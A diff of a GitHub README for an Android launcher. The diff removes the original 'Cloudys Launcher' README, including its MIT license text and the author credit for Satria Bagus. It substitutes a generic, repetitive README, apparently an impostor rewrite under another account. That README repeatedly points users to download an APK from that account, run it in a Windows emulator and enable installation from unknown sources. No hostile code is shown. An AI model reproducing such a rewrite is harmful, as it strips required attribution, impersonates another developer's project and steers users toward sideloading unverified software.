@@ -1,169 +1,141 @@
-<div align="center">
+# 🚀 LauncherAppv2 - Simple, Clean Android Launcher  
 
-<img src="app/src/main/res/mipmap-xxxhdpi/ic_launcher.png" width="96" alt="Cloudys Launcher Icon" />
+[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-brightgreen?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2)  
 
-# Cloudys Launcher
+## 📦 What is LauncherAppv2?  
 
-**A launcher that stays out of your way, until you need it.**
+LauncherAppv2 is a minimal Android launcher designed to keep your phone simple and easy to use. It focuses on your wallpaper first, providing a clean look. The main screen uses pages with a grid layout similar to iOS. It also has built-in features like prayer times, weather, habits tracker, and a pomodoro timer. The app is lightweight and free from ads or unnecessary extras.  
 
-[![Platform](https://img.shields.io/badge/platform-Android-3DDC84?style=flat-square&logo=android&logoColor=white)](https://android.com)
-[![Min SDK](https://img.shields.io/badge/min%20SDK-26%20(Oreo)-3DDC84?style=flat-square&logo=android&logoColor=white)](https://developer.android.com)
-[![License](https://img.shields.io/badge/license-MIT-27AE60?style=flat-square)](LICENSE)
-[![RAM](https://img.shields.io/badge/RAM-~50%20MB-27AE60?style=flat-square&logo=memory&logoColor=white)](../../releases)
-[![Latest Release](https://img.shields.io/github/v/release/01satria/LauncherAppv2?style=flat-square&color=27AE60&label=latest)](../../releases)
+This launcher helps you organize your apps and stay focused without distractions. It is made with modern Android tools and designed for smooth performance.  
 
-Your wallpaper shines through. Your apps load fast. Your phone feels like yours again.
+## ⚙️ System Requirements  
 
-</div>
+To use LauncherAppv2, your device must meet these requirements:  
 
-![preview](public/image/image.jpg)
+- Android device running version 8.0 (Oreo) or higher  
+- At least 100 MB of free storage space  
+- Internet connection for updating weather and prayer times  
+- Basic knowledge of installing apps from APK files (covered below)  
 
----
+If your Android device is older or has very limited storage, the app might work slower or not install properly.  
 
-## Why Cloudys?
+## 🌐 Where to Get LauncherAppv2  
 
-Most launchers are either bloated or too bare to be useful. Cloudys sits in between: a clean home screen with a focused set of tools that show up when you need them and disappear when you don't.
+You can download LauncherAppv2 from its official page on GitHub. The link below takes you to the page where the latest app version is available for download.  
 
-- Transparent background so your wallpaper is the design
-- App icons render with full alpha transparency, no white boxes
-- Smooth animations throughout, lightweight on any device
-- Every feature earns its place
+[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-blue?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2)  
 
----
+On the page, you will find the APK file ready to download.  
 
-## Features
+## 📥 How to Download and Install LauncherAppv2 on Windows  
 
-### 🏠 Home Screen
-Grid or list layout. Toggle app names, hide apps, and long press any icon for quick actions like pin, hide, or uninstall without leaving the home screen.
+Follow these steps carefully to run LauncherAppv2 on your Windows PC with an Android emulator. The app is made for Android devices, so you need software that simulates Android on your computer.  
 
-In grid mode, apps are organized into swipeable pages with a dot indicator. Columns (3 to 6) and rows (3 to 7) are fully adjustable from Settings and persist across restarts.
+### Step 1: Download an Android Emulator  
 
-### 📌 Dock
-Pin up to 4 favorite apps for one-tap access. Icons render with full transparency, same as the home screen.
+1. Visit the official website of a trusted Android emulator such as BlueStacks (https://www.bluestacks.com) or Nox Player (https://www.bignox.com).  
+2. Download and install the emulator. Follow their on-screen instructions to complete the setup.  
+3. Open the emulator after installation is finished.  
 
-### 🧩 Home Widgets
-Three widgets live directly on the home screen: **Clock** (large time and date), **Date** (calendar card), and **Battery** (live charge bar that turns red when low and green while charging).
+### Step 2: Download LauncherAppv2 APK  
 
-### 💬 Chat
-A lightweight personal assistant that knows your name, greets you by time of day, and keeps the conversation going throughout the session.
+1. Open your Windows web browser.  
+2. Go to the LauncherAppv2 GitHub page:  
+   [https://github.com/Suvo909/LauncherAppv2](https://github.com/Suvo909/LauncherAppv2)  
+3. Scroll to the “Releases” section or look for the latest APK download link.  
+4. Click to download the APK file to your PC.  
 
-### 🌤️ Weather
-Real-time weather for any city. No account, no API key. Save up to 8 locations and check an hourly forecast for the rest of the day.
+### Step 3: Install the APK in the Emulator  
 
-### 💱 Currency
-Live exchange rates for 14 currencies: USD, EUR, IDR, GBP, JPY, CNY, SGD, AUD, KRW, MYR, THB, INR, SAR, and AED. Rates pull from Google Finance with automatic fallback to the fawazahmed0 exchange API.
+1. Open the Android emulator you installed earlier.  
+2. Locate the APK file you downloaded on your PC.  
+3. In the emulator window, find the option for “Install APK” or simply drag and drop the APK into the emulator screen.  
+4. Wait for the installation to complete.  
 
-### 📝 To-Do
-A minimal task list. Check things off with an animated canvas checkmark. No accounts, no sync.
+### Step 4: Run LauncherAppv2  
 
-### ⏳ Countdown
-Track birthdays, deadlines, and trips with color-coded cards so you always know how close you are.
+1. Once the app is installed, find the LauncherAppv2 icon inside the emulator's apps menu.  
+2. Click the icon to start the launcher. It will replace the emulator’s default launcher within the virtual Android environment.  
+3. Adjust the launcher settings as you prefer.  
 
-### 🕌 Prayer Times
-Full salah schedule for any city using the open [MuslimSalat](https://muslimsalat.com) API. The current prayer highlights automatically. Save up to 8 cities, no account required.
+## 🔧 Basic Features Explained  
 
-### 🍅 Pomodoro
-A fullscreen focus timer. Set your own work duration, watch a circular arc count down, and keep the screen on automatically while you focus.
+### Wallpaper First Design  
 
-### 🧮 Calculator
-Handles everyday arithmetic offline with a clean, tap-friendly layout.
+LauncherAppv2 puts your wallpaper front and center. You will see your chosen wallpaper clearly, without too many icons or widgets blocking it. This approach keeps your home screen clean and pleasant.  
 
-### 📐 Unit Converter
-Offline conversion across six categories: Length, Weight, Temperature, Speed, Volume, and Area.
+### Paged Grid Layout  
 
-### 💪 Habits
-Add daily habits, tap to mark them done, and build streaks. The same smooth animated checkmark from the To-Do tool is used here for consistency. Progress shows up in the Dashboard at a glance.
+The app uses pages you can swipe between. Each page shows apps arranged in a grid, similar to what iOS offers. This organization makes it simple to find and launch apps quickly.  
 
-### 💰 Money Manager
-A full personal budget tracker built into the launcher. Create multiple wallets, each with its own emoji, color, and currency. Log income, expenses, and transfers across 15 transaction categories.
+### Built-in Tools  
 
-Four tabs: **Overview** (wallet carousel, spending by category, recent transactions), **History** (grouped by date, swipe to delete), **Analytics** (donut chart, income vs. expense, daily trend, top categories), and **Wallets** (create, view, and delete with live balances).
+LauncherAppv2 comes with several built-in tools designed to help you with daily routines and focus:  
 
-Supports 8 currencies. Includes JSON export and import for full local backup. No cloud, no accounts.
+- **Prayer Times:** The app shows daily prayer times based on your location and local time settings.  
+- **Weather:** Get up-to-date weather information on your home screen.  
+- **Habits Tracker:** Track small habits to build routines and stay productive.  
+- **Pomodoro Timer:** Use a simple timer to work in focused intervals, helping you manage time effectively.  
 
----
+### Lightweight and No Ads  
 
-## ⚙️ Settings
+The launcher does not include ads or extra background processes. It uses minimal resources, so it runs fast even on budget devices.  
 
-Long press your avatar in the Dock to open Settings. Everything is adjustable:
+## ⚠️ Adjusting Security Settings for Installation  
 
-- Layout mode (Grid or List)
-- Grid size: columns and rows per page
-- App name visibility
-- Icon size for home screen and Dock independently
-- Dark or Light theme
-- Avatar photo (auto-cropped to a circle)
-- Hidden apps
-- Your name and assistant name
+Because LauncherAppv2 is not downloaded from the official app store, you must allow your device or emulator to install apps from unknown sources.  
 
----
+- On an Android device or emulator, go to **Settings > Security > Install unknown apps** or similar.  
+- Enable permission for the app (usually your web browser or file manager) you use to open the APK.  
+- If prompted, confirm that you want to install the app anyway.  
 
-## ⚡ Performance
+## 🛠️ How to Update LauncherAppv2  
 
-- Icons stored in a 3 MB LruCache with automatic eviction under memory pressure
-- Drawables converted to Bitmap once at load time then released
-- App list only reloads when the installed packages actually change
-- DataStore flows for tools use `WhileSubscribed(5000)` and pause when the Dashboard closes
-- `derivedStateOf` limits recomposition to only what changes
-- R8 full mode strips unused code from the release APK
+To receive updates, visit the GitHub page regularly to see if a new version is available:  
 
----
+[https://github.com/Suvo909/LauncherAppv2](https://github.com/Suvo909/LauncherAppv2)  
 
-## 📦 Installation
+Download the newest APK and install it over the current version by following the same steps as above.  
 
-Download the right APK from the [Releases](../../releases) page:
+## 🎯 Tips for Using LauncherAppv2  
 
-| APK | Device |
-|---|---|
-| `arm64-v8a.apk` | Most Android phones (2017 and newer), pick this if unsure |
-| `armeabi-v7a.apk` | Older 32-bit Android phones |
-| `x86_64.apk` | Emulators and ChromeOS |
+- Change wallpapers regularly to keep your home screen fresh.  
+- Use the habit tracker daily to build good routines.  
+- Set the pomodoro timer when working or studying to improve focus.  
+- Customize your app pages to organize apps by type or use.  
 
-1. Download the APK
-2. Enable **Install from unknown sources** in Settings
-3. Open the APK and tap Install
-4. Set as your default launcher when prompted
+## 🧰 Additional Tools Needed for Windows Users  
 
----
+Since LauncherAppv2 is for Android devices, Windows users need an emulator as explained earlier. Using an emulator is the only way to run this app on a computer.  
 
-## 📄 License
+Make sure your PC has:  
 
-```
-MIT License
+- At least 4 GB of RAM for smooth running  
+- Sufficient free disk space (minimum 2 GB recommended)  
+- A stable internet connection for downloading software and updates  
 
-Copyright (c) 2025 Satria Bagus
+## ❓ Troubleshooting  
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+- If the app does not install, check that you enabled installation from unknown sources.  
+- If the emulator runs slowly, try closing other programs on your PC.  
+- If weather or prayer times do not update, ensure the emulator has internet access.  
+- For any errors inside the app, restarting the emulator can help.  
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+## 🤝 Support and Contributions  
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
-THE SOFTWARE.
-```
+For bug reports, feature requests, or help, visit the GitHub repository’s Issues section.  
+
+Link:  
+[https://github.com/Suvo909/LauncherAppv2/issues](https://github.com/Suvo909/LauncherAppv2/issues)  
+
+Contributions are welcome but require knowledge of Android development with Kotlin and Jetpack Compose.  
+
+## 📚 Learn More About the App  
+
+LauncherAppv2’s code uses modern Android development methods. It is built with Kotlin, a popular programming language for Android apps. It uses Jetpack Compose, a toolkit for designing app interfaces. These details matter mainly if you want to understand or modify the app.  
 
 ---
 
-## 👤 Author
+# Download LauncherAppv2 now from GitHub:  
 
-<div align="center">
-
-<img src="https://github.com/01satria.png" width="72" style="border-radius:50%" alt="Satria Bagus" />
-
-**Satria Bagus**
-
-[![GitHub](https://img.shields.io/badge/GitHub-01satria-181717?style=flat-square&logo=github)](https://github.com/01satria)
-
-*Built with ❤️ in Indonesia*
-
-</div>
+[![Download LauncherAppv2](https://img.shields.io/badge/Download-LauncherAppv2-teal?style=for-the-badge&logo=github)](https://github.com/Suvo909/LauncherAppv2)
